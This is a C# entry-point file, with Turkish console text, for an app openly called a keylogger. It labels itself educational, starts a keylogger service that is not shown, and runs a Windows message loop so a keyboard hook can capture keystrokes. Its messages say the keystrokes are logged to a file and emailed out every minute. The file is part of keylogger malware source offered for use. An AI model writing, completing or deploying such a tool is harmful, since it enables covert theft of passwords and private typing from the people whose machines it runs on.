using System;
using System.Threading;
using System.Windows.Forms;

namespace KeyloggerApp
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("==============================================");
            Console.WriteLine("  KEYLOGGER UYGULAMASI - EĞİTİM AMAÇLI");
            Console.WriteLine("==============================================");
            Console.WriteLine();
            Console.WriteLine("UYARI: Bu uygulama sadece eğitim amaçlıdır!");
            Console.WriteLine("Sadece kendi bilgisayarınızda kullanın.");
            Console.WriteLine();
            
            // Ana keylogger servisini başlat
            KeyloggerService keylogger = new KeyloggerService();
            keylogger.Start();
            
            Console.WriteLine("Keylogger başlatıldı...");
            Console.WriteLine("Tuş kayıtları log dosyasına yazılıyor.");
            Console.WriteLine("1 dakikada bir otomatik email gönderilecek.");
            Console.WriteLine();
            Console.WriteLine("Durdurmak için 'Q' tuşuna basın.");
            Console.WriteLine("==============================================");
            Console.WriteLine();

            // Konsolda Q'yu dinlemek için ayrı bir thread, ana thread ise Windows mesaj döngüsünü çalıştırır
            var quitRequested = false;
            Console.TreatControlCAsInput = false;
            Console.CancelKeyPress += (s, e) =>
            {
                // Ctrl+C ile nazikçe çık
                e.Cancel = true; // ani sonlandırmayı engelle
                quitRequested = true;
                Application.Exit();
            };
            Thread inputThread = new Thread(() =>
            {
                while (true)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Q)
                    {
                        quitRequested = true;
                        // Tüm mesaj döngülerini sonlandır
                        Application.Exit();
                        break;
                    }
                }
            });
            inputThread.IsBackground = true;
            inputThread.Start();

            // Windows mesaj döngüsünü çalıştır (klavye hook'unun güvenilir çalışması için)
            Application.Run();

            // Q ile çıkıldığında temizlik
            if (quitRequested)
            {
                Console.WriteLine("\nKeylogger durduruluyor...");
            }
            keylogger.Stop();
            Console.WriteLine("Uygulama kapatıldı.");
        }
    }
}

